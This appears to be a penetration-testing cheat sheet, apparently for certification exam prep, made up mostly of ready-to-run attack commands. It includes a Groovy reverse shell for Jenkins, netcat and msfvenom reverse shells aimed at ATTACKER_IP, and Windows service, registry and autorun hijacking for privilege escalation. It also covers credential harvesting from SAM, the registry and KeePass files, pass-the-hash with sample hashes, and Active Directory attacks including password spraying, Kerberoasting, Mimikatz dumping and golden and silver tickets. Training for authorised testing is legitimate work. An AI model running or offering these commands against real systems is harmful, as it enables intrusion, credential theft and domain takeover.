💡 While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-](https://github.com/ivan-sincek/php-reverse-)

#### Groovy reverse-shell

For Jenkins

```groovy
String host="[localhost](http://localhost)";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write([pi.read](http://pi.read)());while(pe.available()>0)so.write([pe.read](http://pe.read)());while(si.available()>0)po.write([si.read](http://si.read)());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Windows Privilege Escalation

#### Basic

```powershell
#Starting, Restarting and Stopping services in Powershell
Start-Service SERVICE_NAME
Stop-Service SERVICE_NAME
Restart-Service SERVICE_NAME

#Powershell History
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Automated Scripts

```
winpeas.exe
winpeas.bat
[Jaws-enum.ps](http://Jaws-enum.ps)1
[powerup.ps](http://powerup.ps)1
[PrivescCheck.ps](http://PrivescCheck.ps)1
```

#### Token Impersonation

* Command to check

```bash
whoami /priv
```

```bash
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe ATTACKER_IP PORT -e cmd"

#RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\temp\nc.exe -a "ATTACKER_IP PORT -e cmd" > w.log  #writes whoami command to w.log file
```

#### Services

#### Binary Hijacking

```bash
#Identify service from winpeas
icalcs "path"  #F means full permission, we need to check we have full access on folder
sc qc SERVICE_NAME  #find binarypath variable
sc config SERVICE_NAME binpath= "C:\temp\reverse.exe"  #change the path to the reverseshell location
sc start SERVICE_NAME
```

#### Unquoted Service Path

```bash
wmic service get name,pathname | findstr /i /v "C:\\" | findstr /i /v """  #Display services with unquoted paths
#Check the Writable path
icalcs "path"
#Insert the payload in writable location and which works.
sc start SERVICE_NAME
```

#### Insecure Service Executables

In Winpeas look for a service which has the following

```
File Permissions: Everyone [AllAccess]
```

Replace the executable in the service folder and start the service

```bash
sc start SERVICE_NAME
```

#### Weak Registry permissions

Look for the following in Winpeas services info output

```
HKLM\<service> (Interactive [FullControl])  #This means we can edit the registry value
```

```bash
accesschk /acceptula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICE  #Check for KEY_ALL_ACCESS
#Service Information from regedit, identify the variable which holds the executable
reg query HKLM\SYSTEM\CurrentControlSet\services\SERVICE
reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICE /v ImagePath /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f  #Imagepath is the variable here
net start SERVICE
```

#### DLL Hijacking

_Reference for DLL Hijacking techniques_

#### Autorun

```bash
#For checking, it will display some information with file-location
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
#Check the location is writable
accesschk.exe -wvu "C:\PATH\TO\FILE"  #returns FILE_ALL_ACCESS
#Replace the executable with the reverseshell and we need to wait till Admin logins, then we get shell
```

#### AlwaysInstallElevated

```bash
#For checking, it should return 1 or 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT --platform windows -f msi -o reverse.msi

#Execute and get shell
msiexec /quiet /qn /i reverse.msi
```

#### Schedules Tasks

```bash
schtasks /query /fo LIST /v  #Displays list of scheduled tasks, Pickup any interesting one
#Permission check - Writable means exploitable!
icalcs "path"
#Wait till the scheduled task in executed, then we'll get a shell
```

#### Startup Apps

```
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Startup applications can be found in above locations

Check writable permissions and transfer reverse shell there

The only catch here is the system needs to be restarted

#### Insecure GUI apps

Check the applications that are running from "TaskManager" and obtain list of applications running with high integrity

Open that particular application, using "open" feature enter the following

```
[file://c:/windows/system32/cmd.exe](file://c:/windows/system32/cmd.exe)
```

#### Passwords

#### Sensitive files

```bash
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system

findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
Findstr /si password *.config
findstr /si pass/pwd *.ini

dir /s *pass* == *cred* == *vnc* == *.config*
```

in all files

```bash
findstr /spin "password" *.*
findstr /spin "password" *.*
```

#### Config files

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

```bash
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c: /s /b | findstr /si *vnc.ini
```

#### Registry

```bash
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

### Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

### SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

### Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

### Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### RunAs - Savedcreds

```bash
cmdkey /list  #Displays stored credentials, looks for any potential users
#Transfer the reverseshell
runas /savecred /user:admin C:\temp\reverse.exe
```

#### Pass the Hash

If hashes are obtained through some means then use psexec, smbexec and obtain the shell as Administrator

```bash
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe //TARGET_IP cmd
```

### Linux Privilege Escalation

#### TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

#### Basic

```bash
find / -writable -type d 2>/dev/null
dpkg -l  #Installed applications on debian system
cat /etc/fstab  #Listing mounted drives
lsblk  #Listing all available drives
lsmod  #Listing loaded drivers
```

#### Automated Scripts

```
[linPEAS.sh](http://linPEAS.sh)
[LinEnum.sh](http://LinEnum.sh)
[linuxprivchecker.py](http://linuxprivchecker.py)
unix-privesc-check
Metasploit: multi/recon/local_exploit_suggester
```

#### Sensitive Information

```bash
cat .bashrc
env  #checking environment variables
watch -n 1 "ps -aux | grep pass"  #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
```

#### Sudo/SUID/Capabilities

💡 GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

#### Cron Jobs

```bash
#Detecting Cronjobs
cat /etc/crontab
crontab -l
pspy  #handy tool to livemonitor stuff happening in Linux
```

#### NFS

```bash
##Mountable shares
cat /etc/exports  #On target
showmount -e TARGET_IP  #On attacker
###Check for "no_root_squash" in the output of shares
mount -o rw TARGET_IP:SHARE_PATH LOCAL_MOUNT_POINT  #Now create a binary there
chmod +x BINARY_NAME
```

### Post Exploitation

This is more windows specific as exam specific.

💡 Run WinPEAS.exe - This may give us some more detailed information as now we're a privileged user and we can open several files, gives some edge!

#### Sensitive Information

#### Powershell History

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Example:

```bash
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Searching for passwords

```bash
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

#### Searching in Registry for Passwords

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

💡 Always check documents folders, it may contain some juicy files

#### KDBX Files

These are KeyPassX password stored files

```bash
cmd> dir /s /b *.kdbx
```

```powershell
Ps> Get-ChildItem -Recurse -Filter *.kdbx
```

Cracking:

```bash
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

#### Dumping Hashes

1. Mimikatz
2. If this is a domain joined machine, then follow Post-exp steps for AD.

### Active Directory Pentesting

#### Enumeration

To check local administrators in domain joined machine

```bash
net localgroup Administrators
```

#### Powerview

```powershell
Import-Module .\[PowerView.ps](http://PowerView.ps)1  #loading module to powershell, if it gives error then change execution policy
Get-NetDomain  #basic information about the domain
Get-NetUser  #list of all users in the domain
```

* The above command's outputs can be filtered using "select" command. For example, `Get-NetUser | select name`

```powershell
Get-NetGroup  # enumerate domain groups
Get-NetGroup "group name"  # information from specific group
Get-NetComputer  # enumerate the computer objects in the domain
Find-LocalAdminAccess  # scans the network in an attempt to determine if our current user has administrative access
Get-NetSession -ComputerName files04 -Verbose  #Checking logged on users with Get-NetSession
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # Listing SPN accounts in domain
Get-ObjectAcl -Identity USERNAME  # enumerates ACE(access control entities), lists SID(security identifier)
Convert-SidToName SID  # converting SID/ObjSID to name
```

* Checking for "GenericAll" right for a specific group, after obtaining they can be converted to name

```powershell
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier | select -ExpandProperty SecurityIdentifier | Convert-SidToName
Find-DomainShare  #find the shares in the domain
Get-DomainUser -PreauthNotRequired -verbose  # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname  #Kerberoastable accounts
```

#### Bloodhound

* Collection methods - database
* Sharphound - transfer [sharphound.ps](http://sharphound.ps)1 into the compromised machine

```powershell
Import-Module .\[Sharphound.ps](http://Sharphound.ps)1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "name"
```

* Bloodhound-Python

```bash
bloodhound-python -u 'username' -p 'password' -ns DC_IP -d [DOMAIN.COM](http://DOMAIN.COM) -c all  #output will be in json format
```

* Running Bloodhound

```bash
sudo neo4j console
```

* then upload the .json files obtained

#### PsLoggedon

To see user logons at remote system of a domain(external tool)

```bash
PsLoggedon.exe \\TARGET_COMPUTER
```

#### Attacking Active Directory Authentication

💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don't have proper creds.

#### Password Spraying

* Crackmapexec - check if the output shows 'Pwned!'

```bash
crackmapexec smb SUBNET_OR_IP -u users.txt -p 'password' -d DOMAIN --continue-on-success
```

* Kerbrute

```bash
kerbrute passwordspray -d [corp.com](http://corp.com) users.txt "password"
```

#### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #this gives us the hash
Rubeus.exe asreproast /nowrap  #dumping from compromised windows host
hashcat -m 18200 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Kerberoasting

```bash
Rubeus.exe kerberoast /outfile:hashes.kerberoast  #dumping from compromised windows host
impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD -request  #from kali machine
hashcat -m 13100 hashes.txt wordlist.txt --force  # cracking hashes
```

#### Silver Tickets

* Obtaining hash of an SPN user using Mimikatz

```
privilege::debug
sekurlsa::logonpasswords  #obtain NTLM hash of the SPN account here
```

* Obtaining Domain SID

```powershell
ps> whoami /user
```

* this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369"
* Forging silver ticket using Mimikatz

```
kerberos::golden /sid:<domainsid> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit
```

* we can check the tickets by,

```powershell
ps> klist
```

* Accessing service

```powershell
ps> iwr -UseDefaultCredentials [http://web04.corp.com:8080/](http://web04.corp.com:8080/)
```

#### Secretsdump

```bash
[secretsdump.py](http://secretsdump.py) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

#### Lateral Movement in Active Directory

#### psexec - smbexec - wmiexec - atexec

* Here we can pass the credentials or even hash, depending on what we have

```bash
[psexec.py](http://psexec.py) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

* the user should have write access to Admin share then only we can get session

```bash
[psexec.py](http://psexec.py) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[smbexec.py](http://smbexec.py) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[smbexec.py](http://smbexec.py) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[wmiexec.py](http://wmiexec.py) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[wmiexec.py](http://wmiexec.py) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[atexec.py](http://atexec.py) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip> "command"  #we passed full hash here
```

#### winrs

```bash
winrs -r:TARGET_IP -u:USERNAME -p:PASSWORD "command"
```

* run this and check whether the user has access on the machine, if you have access then you can get shell
* run this on windows session

#### crackmapexec

* If stuck make use of Wiki

```bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}  #supported services

crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success  # Bruteforce
crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success | grep '[+]'  # Filter successful logins
crackmapexec smb SUBNET_OR_IP -u user.txt -p 'password' --continue-on-success  #Password spraying
crackmapexec smb TARGET_IP -u 'user' -p 'password' --shares  #lists all shares, provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --disks
crackmapexec smb DC_IP -u 'user' -p 'password' --users  #we need to provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sessions  #active logon sessions
crackmapexec smb DC_IP -u 'user' -p 'password' --pass-pol  #dumps password policy
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sam  #SAM hashes
crackmapexec smb TARGET_IP -u 'user' -p 'password' --lsa  #dumping lsa secrets
crackmapexec smb DC_IP -u 'user' -p 'password' --ntds  #dumps NTDS.dit file
crackmapexec smb DC_IP -u 'user' -p 'password' --groups {groupname}  #we can also provide --group and it lists all groups
crackmapexec smb TARGET_IP -u 'user' -p 'password' -x 'command'  #For executing commands

#crackmapexec modules
crackmapexec smb -L  #listing modules
crackmapexec smb -M mimikatz --options  #shows the required options for the module
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz  #runs default command
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

#### Pass the ticket

```
mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
klist
dir \\dc01.corp.local\c$
```

#### Golden Ticket

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /ptt
misc::cmd
klist
dir \\dc01.corp.local\c$
```

***

